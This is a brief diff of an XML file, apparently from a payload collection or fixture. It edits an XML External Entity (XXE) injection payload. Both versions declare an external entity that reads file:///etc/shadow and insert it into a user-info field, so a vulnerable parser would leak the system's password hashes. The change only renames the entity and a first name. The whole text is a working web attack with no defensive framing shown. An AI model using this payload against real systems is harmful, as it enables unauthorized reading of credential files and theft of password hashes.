@@ -1,6 +1,6 @@
 <!--?xml version="1.0" ?-->
-<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
+<!DOCTYPE replace [<!ENTITY getFile SYSTEM "file:///etc/shadow"> ]>
 <userInfo>
-    <firstName>John</firstName>
-    <lastName>&ent;</lastName>
+    <firstName>Max</firstName>
+    <lastName>&getFile;</lastName>
 </userInfo>
